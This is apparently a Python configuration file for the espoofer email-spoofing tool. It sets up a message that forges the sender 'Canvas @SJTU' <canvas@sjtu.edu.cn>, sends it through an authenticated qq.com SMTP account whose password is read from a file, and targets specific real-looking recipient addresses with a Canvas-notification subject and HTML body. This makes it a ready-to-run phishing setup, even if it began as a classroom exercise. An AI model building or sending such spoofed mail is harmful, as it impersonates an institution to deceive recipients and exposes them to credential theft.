def read_mail(file = 'mail.txt'):
	import os
	# './canvas_notification.html'
	with open(file, 'r') as f:
		str = f.read()
		f.close()

	return str.encode()

def load_password(n = 1):
    with open('password.txt', 'r') as f:
        for _ in range(n):
            password = f.readline()
        f.close()
    return password.encode() 


# sjtu to sjtu with client3
config = {
	"attacker_site": b"qq.com", # attack.com
	"legitimate_site_address": b'"Canvas @SJTU" <canvas@sjtu.edu.cn>', # From header address displayed to the end-user
	"victim_address": b"2097118786@qq.com", # RCPT TO and message.To header address, 
	"case_id": b"client_2", #  You can find all case_id using -l option.

	# The following fields are optional
	"server_mode":{
		"recv_mail_server": "", # If no value, espoofer will query the victim_address to get the mail server ip
		"recv_mail_server_port": 25,
		"starttls": False,
	},
	"client_mode": {
		"sending_server": ("smtp.qq.com", 587),
		"username": b"419768539@qq.com",
		"password": load_password(),
	},

	# Optional. You can leave them empty or customize the email message header or body here
	"subject_header": "Subject: 最近 Canvas 通知\r\n".encode(),  # Subject: Test espoofer\r\n
	"to_header": b"To: dantynoel@sjtu.edu.cn\r\n", # To: <alice@example.com>\r\n
	"body": read_mail('canvas_notification.html'), # Test Body.

	# Optional. Set the raw email message you want to sent. It's usually used for replay attacks
	"raw_email": b"", 
}


